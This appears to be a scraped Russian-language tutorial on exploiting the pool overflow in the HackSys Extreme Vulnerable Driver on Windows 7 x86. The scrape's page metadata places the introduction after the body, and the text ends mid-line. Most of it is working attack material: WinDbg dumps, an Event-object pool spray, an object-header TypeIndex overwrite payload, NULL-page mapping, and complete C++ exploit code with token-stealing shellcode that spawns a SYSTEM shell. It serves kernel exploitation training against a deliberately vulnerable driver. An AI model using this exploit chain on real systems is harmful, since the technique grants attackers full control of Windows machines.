nt!ObTypeIndexTable 82761ee0 00000000 bad0b0b0 84ec7860 84ec7798 82761ef0 84ec76d0 84ec74a0 84ec7360 84ec7298 82761f00 84ec71d0 84ecef78 84eceeb0 84ece818 82761f10 84f60418 84f60350 84f61418 84f61350 82761f20 84f5f3f0 84f5f328 84f629b8 84f628f0 82761f30 84f62828 84f62760 84f62698 84f625d0 82761f40 84f62508 84f62440 84f62378 84f63040 82761f50 84f63f78 84f63bd8 84f63b10 84f63a48 kd&gt; dd nt!ObTypeIndexTable+0xC*4 L1 82761f10 84f60418 kd&gt; dt nt!_OBJECT_TYPE 84f60418 -b +0x000 TypeList : _LIST_ENTRY [ 0x84f60418 - 0x84f60418 ] +0x000 Flink : 0x84f60418 +0x004 Blink : 0x84f60418 +0x008 Name : _UNICODE_STRING &quot;Event&quot; +0x000 Length : 0xa +0x002 MaximumLength : 0xc +0x004 Buffer : 0x8cc08a88 &quot;Event&quot; +0x010 DefaultObject : (null) +0x014 Index : 0xc &#39;&#39; +0x018 TotalNumberOfObjects : 0x5043 +0x01c TotalNumberOfHandles : 0x506e +0x020 HighWaterNumberOfObjects : 0x5e7b +0x024 HighWaterNumberOfHandles : 0x5ea6 +0x028 TypeInfo : _OBJECT_TYPE_INITIALIZER +0x000 Length : 0x50 +0x002 ObjectTypeFlags : 0 &#39;&#39; +0x002 CaseInsensitive : 0y0 +0x002 UnnamedObjectsOnly : 0y0 +0x002 UseDefaultObject : 0y0 +0x002 SecurityRequired : 0y0 +0x002 MaintainHandleCount : 0y0 +0x002 MaintainTypeList : 0y0 +0x002 SupportsObjectCallbacks : 0y0 +0x002 CacheAligned : 0y0 +0x004 ObjectTypeCode : 2 +0x008 InvalidAttributes : 0x100 +0x00c GenericMapping : _GENERIC_MAPPING +0x000 GenericRead : 0x20001 +0x004 GenericWrite : 0x20002 +0x008 GenericExecute : 0x120000 +0x00c GenericAll : 0x1f0003 +0x01c ValidAccessMask : 0x1f0003 +0x020 RetainAccess : 0 +0x024 PoolType : 0 ( NonPagedPool ) +0x028 DefaultPagedPoolCharge : 0 +0x02c DefaultNonPagedPoolCharge : 0x40 +0x030 DumpProcedure : (null) +0x034 OpenProcedure : (null) +0x038 CloseProcedure : (null) +0x03c DeleteProcedure : (null) +0x040 ParseProcedure : (null) +0x044 SecurityProcedure : 0x8288532c +0x048 QueryNameProcedure : (null) +0x04c OkayToCloseProcedure : (null) +0x078 TypeLock : _EX_PUSH_LOCK +0x000 Locked : 0y0 +0x000 Waiting : 0y0 +0x000 Waking : 0y0 +0x000 MultipleShared : 0y0 +0x000 Shared : 0y0000000000000000000000000000 (0) +0x000 Value : 0 +0x000 Ptr : (null) +0x07c Key : 0x6e657645 +0x080 CallbackList : _LIST_ENTRY [ 0x84f60498 - 0x84f60498 ] +0x000 Flink : 0x84f60498 +0x004 Blink : 0x84f60498 По оффсет 0x28 находится структура TypeInfo. Один из её членов ClosePorcedure по оффсету 0x38. Начиная с оффсета 0x0, на который ссылается указатель OBJECT_TYPE, который мы нашли в таблице, CloseProcedure находится по 0x28 + 0x38 = 0x60. ЭТО указатель на функцию, которая будет вызвана при вызове CloseHandle, чтобы освободить Event Objects из невыгружаемого пула памяти. Это наша цель Когда мы особождаем чанк с помощью CloseHandle, ядро идёт по адресу, на который ссылается значение массива по индексу 0xC и ищет по оффсету 0x60 указатель на функцию, вызывая её. kd&gt; dd nt!ObTypeIndexTable 82761ee0 00000000 bad0b0b0 84ec7860 84ec7798 Первый указатель - это 0x0 и мы из ещё не сделанный урок знаем, что мы можем мапить NULL страницу в Windows 7 x86. Итак, благодаря вышеупомянутым блогерам, наш дальнейший путь ясен. Мы корраптим только значение 0xC внутри OBJECT_HEADER, чтобы вместо него было установлено 0x0. Все остальное мы оставим как есть с помощью перезаписи. Таким образом, когда мы освободим этот кусок, ядро начнет искать смещение 0x60 для указателя функции с 0x000000. Поэтому мы просто отобразим страницу NULL и поместим указатель на наш шеллкод по смещению 0x60. Выполняем план Делаем дыры в блоке, чтобы наш буфер расположился там между Event Objects. Мы знаем, что для 0x200 дырки наш нужно освободить 8 объектов, следуя @FuzzySec будем освобождать 8 хендлов Event Objects каждые 0x16 хендлов в нашем векторе. #include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;Windows.h&gt; using namespace std; #define DEVICE_NAME &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot; #define IOCTL 0x22200F vector&lt;HANDLE&gt; defragment_handles; vector&lt;HANDLE&gt; sequential_handles; int main() { HANDLE hFile = CreateFileA(DEVICE_NAME, FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { cout &lt;&lt; &quot;[!] No handle to HackSysExtremeVulnerableDriver\n&quot;; exit(1); } cout &lt;&lt; &quot;[&gt;] Grabbed handle to HackSysExtremeVulnerableDriver: &quot; &lt;&lt; hex &lt;&lt; hFile &lt;&lt; &quot;\n&quot;; cout &lt;&lt; &quot;[&gt;] Spraying pool to defragment...\n&quot;; for (int i = 0; i &lt; 10000; i++) { HANDLE result = CreateEvent(NULL, 0, 0, L&quot;&quot;); if (!result) { cout &lt;&lt; &quot;[!] Error allocating Event Object during defragmentation\n&quot;; exit(1); } defragment_handles.push_back(result); } cout &lt;&lt; &quot;[&gt;] Defragmentation spray complete.\n&quot;; cout &lt;&lt; &quot;[&gt;] Spraying sequential allocations...\n&quot;; for (int i = 0; i &lt; 10000; i++) { HANDLE result = CreateEvent(NULL, 0, 0, L&quot;&quot;); if (!result) { cout &lt;&lt; &quot;[!] Error allocating Event Object during sequential.\n&quot;; exit(1); } sequential_handles.push_back(result); } cout &lt;&lt; &quot;[&gt;] Sequential spray complete.\n&quot;; cout &lt;&lt; &quot;[&gt;] Poking 0x200 byte-sized holes in our sequential allocation...\n&quot;; for (int i = 0; i &lt; sequential_handles.size(); i = i + 0x16) { for (int x = 0; x &lt; 8; x++) { BOOL freed = CloseHandle(sequential_handles[i + x]); if (freed == false) { cout &lt;&lt; &quot;[!] Unable to free sequential allocation!\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; } } } cout &lt;&lt; &quot;[&gt;] Holes poked lol.\n&quot;; ULONG payload_len = 0x1F8; LPVOID input_buff = VirtualAlloc(NULL, payload_len + 0x1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); memset(input_buff, &#39;\x41&#39;, payload_len); cout &lt;&lt; &quot;[&gt;] Sending buffer size of: &quot; &lt;&lt; dec &lt;&lt; payload_len &lt;&lt; &quot;\n&quot;; DWORD bytes_ret = 0; int result = DeviceIoControl(hFile, IOCTL, input_buff, payload_len, NULL, 0, &amp;bytes_ret, NULL); if (!result) { cout &lt;&lt; &quot;[!] DeviceIoControl failed!\n&quot;; } return 0; } Вернёмся к чуть ранее показанному дампу kd&gt; !pool 0x8513C8C8 Pool page 8513c8c8 region is Unknown 8513c000 size: 388 previous size: 0 (Free ) XSav 8513c388 size: 438 previous size: 388 (Free) .... 8513c7c0 size: 40 previous size: 438 (Allocated) Even (Protected) 8513c800 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c840 size: 40 previous size: 40 (Allocated) Even (Protected) 8513c880 size: 40 previous size: 40 (Allocated) Even (Protected) *8513c8c0 size: 200 previous size: 40 (Allocated) *Hack Owning component : Unknown (update pooltag.txt) 8513cac0 size: 40 previous size: 200 (Allocated) Even (Protected) 8513cb00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cb80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cbc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cc80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ccc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd40 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cd80 size: 40 previous size: 40 (Allocated) Even (Protected) 8513cdc0 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce00 size: 40 previous size: 40 (Allocated) Even (Protected) 8513ce40 size: 1c0 previous size: 40 (Free) Even Наш аллокцированный чанк лежит ровно между объектами, которые мы сами создали Портим память Теперь, когда мы контролируем пул с достаточно предсказуемой манере, время перезаписать тут индекс и изменить его на 0x0 с 0xC. Всё остальное между нашей 0x200 аллокацией и этим байтом должно остаться таким же, иначе БСОД. Давайте просто воспользуемся командой dd, чтобы сдампить 32 значения DWORD из начала Event Objects сразу после нашего буфера ядра. kd&gt; dd 8513cac0 ReadVirtual: 8513cac0 not properly sign extended 8513cac0 04080040 ee657645 00000000 00000040 8513cad0 00000000 00000000 00000001 00000001 8513cae0 00000000 0008000c 86e7f640 00000000 8513caf0 ff040001 00000000 8513caf8 8513caf8 8513cb00 04080008 ee657645 00000000 00000040 8513cb10 00000000 00000000 00000001 00000001 8513cb20 00000000 0008000c 86e7f640 00000000 8513cb30 ff040001 00000000 8513cb38 8513cb38 Окей, нам нужно сохранить всё, как есть кроме 0xC и перезаписать этот байт нулём. Мы перезаписываем 40 байтов или 0x28, что даёт нам буфер размером 0x220 ULONG payload_len = 0x220; BYTE* input_buff = (BYTE*)VirtualAlloc(NULL, payload_len + 0x1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); BYTE overwrite_payload[] = ( &quot;\x40\x00\x08\x04&quot; // pool header &quot;\x45\x76\x65\xee&quot; // pool tag &quot;\x00\x00\x00\x00&quot; // obj header quota begin &quot;\x40\x00\x00\x00&quot; &quot;\x00\x00\x00\x00&quot; &quot;\x00\x00\x00\x00&quot; // obj header quota end &quot;\x01\x00\x00\x00&quot; // obj header begin &quot;\x01\x00\x00\x00&quot; &quot;\x00\x00\x00\x00&quot; &quot;\x00\x00\x08\x00&quot; // 0xc converted to 0x0 ); memset(input_buff, &#39;\x42&#39;, 0x1F8); memcpy(input_buff + 0x1F8, overwrite_payload, 0x28) Нам нужно аллоцировать NULL страницу, что взято у tekwizzz123 typedef NTSTATUS(WINAPI *_NtAllocateVirtualMemory)( HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T AllocationSize, ULONG AllocationType, ULONG Protect ); void allocate_shellcode() { _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtAllocateVirtualMemory&quot;); INT64 address = 0x1; int size = 0x100; HANDLE result = (HANDLE)NtAllocateVirtualMemory( GetCurrentProcess(), (PVOID*)&amp;address, NULL, (PSIZE_T)&amp;size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (result == INVALID_HANDLE_VALUE) { cout &lt;&lt; &quot;[!] Unable to allocate NULL page...wtf?\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; dec &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; exit(1); } cout &lt;&lt; &quot;[&gt;] NULL page mapped.\n&quot;; cout &lt;&lt; &quot;[&gt;] Putting &#39;AAAA&#39; on NULL page...\n&quot;; memset((void*)0x0, &#39;\x41&#39;, 0x100); } Также заполним NULL страницу \x42 значениями, чтобы, запустив этот код, мы получили Access Violation со значением 0x42424242 в eip И последнее, нам нужно освободить наши чанки, чтобы активировалась CloseProcedure void free_chunks() { cout &lt;&lt; &quot;[&gt;] Freeing defragmentation allocations...\n&quot;; for (int i = 0; i &lt; defragment_handles.size(); i++) { BOOL freed = CloseHandle(defragment_handles[i]); if (freed == false) { cout &lt;&lt; &quot;[!] Unable to free defragment allocation!\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; exit(1); } } cout &lt;&lt; &quot;[&gt;] Defragmentation allocations freed.\n&quot;; cout &lt;&lt; &quot;[&gt;] Freeing sequential allocations...\n&quot;; for (int i = 0; i &lt; sequential_handles.size(); i++) { BOOL freed = CloseHandle(sequential_handles[i]); if (freed == false) { cout &lt;&lt; &quot;[!] Unable to free defragment allocation!\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; exit(1); } } cout &lt;&lt; &quot;[&gt;] Sequential allocations freed.\n&quot;; } Где-то здесь я пришёл к выводу, что его код всё-таки хороший и идея раскидать всё по функция стоит того)))) kd&gt; g Breakpoint 0 hit HEVD!TriggerPoolOverflow: a815b12a 6a14 push 14h kd&gt; g Breakpoint 1 hit HEVD!TriggerPoolOverflow+0xe6: a815b210 686cc315a8 push offset HEVD! ?? ::NNGAKEGL::`string&#39; (a815c36c) kd&gt; g Access violation - code c0000005 (!!! second chance !!!) 41414141 ?? ??? Видим, что 0xC поменялся на 0x0 kd&gt; db 8756dd40-8 ReadVirtual: 8756dd38 not properly sign extended 8756dd38 42 42 42 42 42 42 42 42-40 00 08 04 45 76 65 ee BBBBBBBB@...Eve. 8756dd48 00 00 00 00 40 00 00 00-00 00 00 00 00 00 00 00 ....@........... 8756dd58 01 00 00 00 01 00 00 00-00 00 00 00 -&gt;00&lt;- 00 08 00 ................ 8756dd68 40 b2 eb 86 00 00 00 00-01 00 04 00 00 00 00 00 @............... 8756dd78 78 dd 56 87 78 dd 56 87-08 00 08 04 45 76 65 ee x.V.x.V.....Eve. 8756dd88 00 00 00 00 40 00 00 00-00 00 00 00 00 00 00 00 ....@........... 8756dd98 01 00 00 00 01 00 00 00-00 00 00 00 0c 00 08 00 ................ 8756dda8 40 b2 eb 86 00 00 00 00-01 00 04 00 00 00 00 00 @............... kd&gt; dd 0x00000000 00000000 41414141 41414141 41414141 41414141 00000010 41414141 41414141 41414141 41414141 Шеллкод kd&gt; k # ChildEBP RetAddr WARNING: Frame IP not in any known module. Following frames may be wrong. 00 a9f93ae8 82886565 0x41414141 01 a9f93b38 828b54a7 nt!ObpCloseHandleTableEntry+0x6d 02 a9f93b68 8289d617 nt!ExSweepHandleTable+0x5f 03 a9f93b88 828aa467 nt!ObKillProcess+0x54 04 a9f93bfc 8289d0fa nt!PspExitThread+0x5e4 05 a9f93c24 82679e06 nt!NtTerminateProcess+0x12e &lt;Intermediate frames may have been skipped due to lack of complete unwind&gt; 06 a9f93c24 77ab6c74 (T) nt!KiSystemServicePostCall &lt;Intermediate frames may have been skipped due to lack of complete unwind&gt; 07 0030f9b0 7754be67 (T) 0x77ab6c74 08 0030f9c4 6e33603d 0x7754be67 09 0030fa18 6e3361b1 0x6e33603d 0a 0030fa24 00021a10 0x6e3361b1 0b 0030fa40 00021a57 0x21a10 0c 0030fa4c 00023007 0x21a57 0d 0030fa94 7753ef8c 0x23007 0e 0030faa0 77ad367a 0x7753ef8c 0f 0030fae0 77ad364d 0x77ad367a 10 0030faf8 00000000 0x77ad364d 8288650d 0fb64e0c movzx ecx,byte ptr [esi+0Ch] 82886511 8b1c8de02e7882 mov ebx,dword ptr nt!ObTypeIndexTable (82782ee0)[ecx*4] 82886518 57 push edi 82886519 648b3d24010000 mov edi,dword ptr fs:[124h] 82886520 837b7400 cmp dword ptr [ebx+74h],0 82886524 8d4e18 lea ecx,[esi+18h] 82886527 894c2414 mov dword ptr [esp+14h],ecx 8288652b c644241300 mov byte ptr [esp+13h],0 82886530 0f8497000000 je nt!ObpCloseHandleTableEntry+0xd5 (828865cd) 82886536 648b0d24010000 mov ecx,dword ptr fs:[124h] 8288653d 8b4510 mov eax,dword ptr [ebp+10h] 82886540 394150 cmp dword ptr [ecx+50h],eax 82886543 7410 je nt!ObpCloseHandleTableEntry+0x5d (82886555) 82886545 8d4c2420 lea ecx,[esp+20h] 82886549 51 push ecx 8288654a 50 push eax 8288654b e8c71ce5ff call nt!KeStackAttachProcess (826d8217) 82886550 c644241301 mov byte ptr [esp+13h],1 82886555 ff7518 push dword ptr [ebp+18h] 82886558 ff7514 push dword ptr [ebp+14h] 8288655b ff74241c push dword ptr [esp+1Ch] 8288655f ff7510 push dword ptr [ebp+10h] 82886562 ff5374 call dword ptr [ebx+74h] 82886565 84c0 test al,al 82886567 7561 jne nt!ObpCloseHandleTableEntry+0xd2 (828865ca) Видим пуши, которые нужно будет компенсировать попом в конце шеллкода kd&gt; dd 0x0 00000000 00000000 00000000 00000000 00000000 00000010 00000000 00000000 00000000 00000000 00000020 00000000 00000000 00000000 00000000 00000030 00000000 00000000 00000000 00000000 00000040 00000000 00000000 00000000 00000000 00000050 00000000 00000000 00000000 00000000 00000060 00060000 00000000 00000000 00000000 00000070 00000000 00000000 00000000 00000000 kd&gt; u 00060000 L15 00060000 60 pushad 00060001 64a124010000 mov eax,dword ptr fs:[00000124h] 00060007 8b4050 mov eax,dword ptr [eax+50h] 0006000a 89c1 mov ecx,eax 0006000c 8b98f8000000 mov ebx,dword ptr [eax+0F8h] 00060012 ba04000000 mov edx,4 00060017 8b80b8000000 mov eax,dword ptr [eax+0B8h] 0006001d 2db8000000 sub eax,0B8h 00060022 3990b4000000 cmp dword ptr [eax+0B4h],edx 00060028 75ed jne 00060017 0006002a 8b90f8000000 mov edx,dword ptr [eax+0F8h] 00060030 8991f8000000 mov dword ptr [ecx+0F8h],edx 00060036 61 popad 00060037 c21000 ret 10h 0006003a 0000 add byte ptr [eax],al 0006003c 0000 add byte ptr [eax],al 0006003e 0000 add byte ptr [eax],al 00060040 0000 add byte ptr [eax],al 00060042 0000 add byte ptr [eax],al 00060044 0000 add byte ptr [eax],al 00060046 0000 add byte ptr [eax],al Полный код #include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;Windows.h&gt; using namespace std; #define DEVICE_NAME &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot; #define IOCTL 0x22200F typedef NTSTATUS(WINAPI* _NtAllocateVirtualMemory)( HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T AllocationSize, ULONG AllocationType, ULONG Protect ); vector&lt;HANDLE&gt; defragment_handles; vector&lt;HANDLE&gt; sequential_handles; HANDLE grab_handle() { HANDLE hFile = CreateFileA(DEVICE_NAME, FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { cout &lt;&lt; &quot;[!] No handle to HackSysExtremeVulnerableDriver\n&quot;; exit(1); } cout &lt;&lt; &quot;[&gt;] Grabbed handle to HackSysExtremeVulnerableDriver: &quot; &lt;&lt; hex &lt;&lt; hFile &lt;&lt; &quot;\n&quot;; return hFile; } void spray_pool() { cout &lt;&lt; &quot;[&gt;] Spraying pool to defragment...\n&quot;; for (int i = 0; i &lt; 10000; i++) { HANDLE result = CreateEvent(NULL, 0, 0, L&quot;&quot;); if (!result) { cout &lt;&lt; &quot;[!] Error allocating Event Object during defragmentation\n&quot;; exit(1); } defragment_handles.push_back(result); } cout &lt;&lt; &quot;[&gt;] Defragmentation spray complete.\n&quot;; cout &lt;&lt; &quot;[&gt;] Spraying sequential allocations...\n&quot;; for (int i = 0; i &lt; 10000; i++) { HANDLE result = CreateEvent(NULL, 0, 0, L&quot;&quot;); if (!result) { cout &lt;&lt; &quot;[!] Error allocating Event Object during sequential.\n&quot;; exit(1); } sequential_handles.push_back(result); } cout &lt;&lt; &quot;[&gt;] Sequential spray complete.\n&quot;; cout &lt;&lt; &quot;[&gt;] Poking 0x200 byte-sized holes in our sequential allocation...\n&quot;; for (int i = 0; i &lt; sequential_handles.size(); i = i + 0x16) { for (int x = 0; x &lt; 8; x++) { BOOL freed = CloseHandle(sequential_handles[i + x]); if (freed == false) { cout &lt;&lt; &quot;[!] Unable to free sequential allocation!\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; exit(1); } } } cout &lt;&lt; &quot;[&gt;] Holes poked lol.\n&quot;; } void allocate_shellcode() { _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtAllocateVirtualMemory&quot;); INT64 address = 0x1; int size = 0x100; HANDLE result = (HANDLE)NtAllocateVirtualMemory( GetCurrentProcess(), (PVOID*)&amp;address, NULL, (PSIZE_T)&amp;size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (result == INVALID_HANDLE_VALUE) { cout &lt;&lt; &quot;[!] Unable to allocate NULL page...wtf?\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; dec &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; exit(1); } cout &lt;&lt; &quot;[&gt;] NULL page mapped.\n&quot;; cout &lt;&lt; &quot;[&gt;] Placing pointer to shellcode on NULL page at offset 0x60...\n&quot;; BYTE shellcode[] = ( &quot;\x60&quot; &quot;\x64\xA1\x24\x01\x00\x00&quot; &quot;\x8B\x40\x50&quot; &quot;\x89\xC1&quot; &quot;\x8B\x98\xF8\x00\x00\x00&quot; &quot;\xBA\x04\x00\x00\x00&quot; &quot;\x8B\x80\xB8\x00\x00\x00&quot; &quot;\x2D\xB8\x00\x00\x00&quot; &quot;\x39\x90\xB4\x00\x00\x00&quot; &quot;\x75\xED&quot; &quot;\x8B\x90\xF8\x00\x00\x00&quot; &quot;\x89\x91\xF8\x00\x00\x00&quot; &quot;\x61&quot; &quot;\xC2\x10\x00&quot; // ret 0x10 ); LPVOID shellcode_addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(shellcode_addr, shellcode, sizeof(shellcode)); memset((void*)0x0, &#39;\x00&#39;, 0x100); memcpy((void*)0x60, (void*)&amp;shellcode_addr, 0x4); } void send_payload(HANDLE hFile) { ULONG payload_len = 0x220; BYTE* input_buff = (BYTE*)VirtualAlloc(NULL, payload_len + 0x1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); BYTE overwrite_payload[] = ( &quot;\x40\x00\x08\x04&quot; // pool header &quot;\x45\x76\x65\xee&quot; // pool tag &quot;\x00\x00\x00\x00&quot; // obj header quota begin &quot;\x40\x00\x00\x00&quot; &quot;\x00\x00\x00\x00&quot; &quot;\x00\x00\x00\x00&quot; // obj header quota end &quot;\x01\x00\x00\x00&quot; // obj header begin &quot;\x01\x00\x00\x00&quot; &quot;\x00\x00\x00\x00&quot; &quot;\x00\x00\x08\x00&quot; // 0xc converted to 0x0 ); memset(input_buff, &#39;\x41&#39;, 0x1F8); memcpy(input_buff + 0x1F8, overwrite_payload, 0x28); cout &lt;&lt; &quot;[&gt;] Sending buffer size of: &quot; &lt;&lt; dec &lt;&lt; payload_len &lt;&lt; &quot;\n&quot;; DWORD bytes_ret = 0; int result = DeviceIoControl(hFile, IOCTL, input_buff, payload_len, NULL, 0, &amp;bytes_ret, NULL); if (!result) { cout &lt;&lt; &quot;[!] DeviceIoControl failed!\n&quot;; } } void free_chunks() { cout &lt;&lt; &quot;[&gt;] Freeing defragmentation allocations...\n&quot;; for (int i = 0; i &lt; defragment_handles.size(); i++) { BOOL freed = CloseHandle(defragment_handles[i]); if (freed == false) { //cout &lt;&lt; &quot;[!] Unable to free defragment allocation!\n&quot;; //cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; //exit(1); } } cout &lt;&lt; &quot;[&gt;] Defragmentation allocations freed.\n&quot;; cout &lt;&lt; &quot;[&gt;] Freeing sequential allocations...\n&quot;; for (int i = 0; i &lt; sequential_handles.size(); i++) { BOOL freed = CloseHandle(sequential_handles[i]); if (freed == false) { //cout &lt;&lt; &quot;[!] Unable to free defragment allocation!\n&quot;; //cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\n&quot;; //exit(1); } } cout &lt;&lt; &quot;[&gt;] Sequential allocations freed.\n&quot;; } void spawn_shell() { cout &lt;&lt; &quot;[&gt;] Spawning nt authority/system shell...\n&quot;; PROCESS_INFORMATION pi; ZeroMemory(&amp;pi, sizeof(pi)); STARTUPINFOA si; ZeroMemory(&amp;si, sizeof(si)); CreateProcessA(&quot;C:\\Windows\\System32\\cmd.exe&quot;, NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi); } int main() { HANDLE hFile = grab_handle(); spray_pool(); allocate_shellcode(); send_payload(hFile); free_chunks(); spawn_shell(); return 0; }" />
<meta property="og:description" content="будет перевод вот этой статейки И ещё вот этой Pool Feng-Shui Перед тем как мы погрузимся в Pool Overflow, нам нужно понять базу пула, как его использовать для наших целей. Действительно хорошая статья по этому поводу есть у Tarjei Mandt. Настоятельно рекумендуется прочитать её перед тем, как идти дальше Ядерный пул очень похож на кучу Windows, так как он используется для хранения динамических аллокаций памяти. Как и Heap Spray для подготовки(?) к обычным приложениям, в пространстве ядра нам нужно найти способ подготовки(?) пула таким образом, чтобы мы могли предсказуемо вызвать наш шеллкод из памяти. Очень важно понимать концепцию аллокатора пула и как работает механизм аллокации и деаллокации пула. Для нашего HEVD драйвера уязвимый пользовательский буфер аллоциется в невыгружемом пуле, так что нам нужно найти технику для грума(?) невыгружаемого пула. Windows предоставляет объект события, который хранится в невыгружаемом пуле и может быть создан с помощью CreateEvent: HANDLE WINAPI CreateEvent( _In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_ BOOL bManualReset, _In_ BOOL bInitialState, _In_opt_ LPCTSTR lpName ); Здесь нам нужно создать два больших массива объектов события с помощью этого апи и затем создать дыры в этом аллоцированном чанке с помощью освобождения некоторых из объектов события в одном из массивов, используя CloseHandle, которые после объединения объединятся в большее большие свободные чанки: BOOL WINAPI CloseHandle( _In_ HANDLE hObject ); В эти свободные чанки нам нужно будет вставить наш уязвимый пользовательский буфер таким образом, чтобы он надежно перезаписывал нужную область памяти каждый раз, как мы будем “портить” соседний заголовок объекта события, чтобы перенаправить поток выполнения на наш шеллкод. После этого мы положим указатель на наш шеллкод таким образом, чтобы он мог быть вызван с помощью манипуляций нашим покоррапченным заголовком. Мы будем фейкать заголовок OBJECT_TYPE, переписывая указатель на одну из процедур в OBJECT_TYPE_INITIALIZER В сорцах видим то же: нет проверким на длину переданного буфера. __try { DbgPrint(&quot;[+] Allocating Pool chunk\n&quot;); // Allocate Pool chunk KernelBuffer = ExAllocatePoolWithTag(NonPagedPool, (SIZE_T)POOL_BUFFER_SIZE, (ULONG)POOL_TAG); if (!KernelBuffer) { // Unable to allocate Pool chunk DbgPrint(&quot;[-] Unable to allocate Pool chunk\n&quot;); Status = STATUS_NO_MEMORY; return Status; } else { DbgPrint(&quot;[+] Pool Tag: %s\n&quot;, STRINGIFY(POOL_TAG)); DbgPrint(&quot;[+] Pool Type: %s\n&quot;, STRINGIFY(NonPagedPool)); DbgPrint(&quot;[+] Pool Size: 0x%X\n&quot;, (SIZE_T)POOL_BUFFER_SIZE); DbgPrint(&quot;[+] Pool Chunk: 0x%p\n&quot;, KernelBuffer); } // Verify if the buffer resides in user mode ProbeForRead(UserBuffer, (SIZE_T)POOL_BUFFER_SIZE, (ULONG)__alignof(UCHAR)); DbgPrint(&quot;[+] UserBuffer: 0x%p\n&quot;, UserBuffer); DbgPrint(&quot;[+] UserBuffer Size: 0x%X\n&quot;, Size); DbgPrint(&quot;[+] KernelBuffer: 0x%p\n&quot;, KernelBuffer); DbgPrint(&quot;[+] KernelBuffer Size: 0x%X\n&quot;, (SIZE_T)POOL_BUFFER_SIZE); #ifdef SECURE // Secure Note: This is secure because the developer is passing a size // equal to size of the allocated Pool chunk to RtlCopyMemory()/memcpy(). // Hence, there will be no overflow RtlCopyMemory(KernelBuffer, UserBuffer, (SIZE_T)POOL_BUFFER_SIZE); #else DbgPrint(&quot;[+] Triggering Pool Overflow\n&quot;); // Vulnerability Note: This is a vanilla Pool Based Overflow vulnerability // because the developer is passing the user supplied value directly to // RtlCopyMemory()/memcpy() without validating if the size is greater or // equal to the size of the allocated Pool chunk RtlCopyMemory(KernelBuffer, UserBuffer, Size); Снова пишем сплойт, ставим бряку и смотрим: #include &lt;Windows.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x22200f const char kDevName[] = &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;; int main() { printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\n&quot;); const char* poc = &quot;AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp&quot;; //printf(&quot;%d&quot;, sizeof(poc)); DWORD bytesRetn; printf(&quot;[+] Starting interaction with the driver\n&quot;); DeviceIoControl(hDevice, IO_CODE, (LPVOID)poc, 100, NULL, 0, &amp;bytesRetn, NULL); //system(&quot;cmd.exe&quot;); CloseHandle(hDevice); return 0; } in windbg: ed nt!Kd_Default_Mask 8 .sympath+ 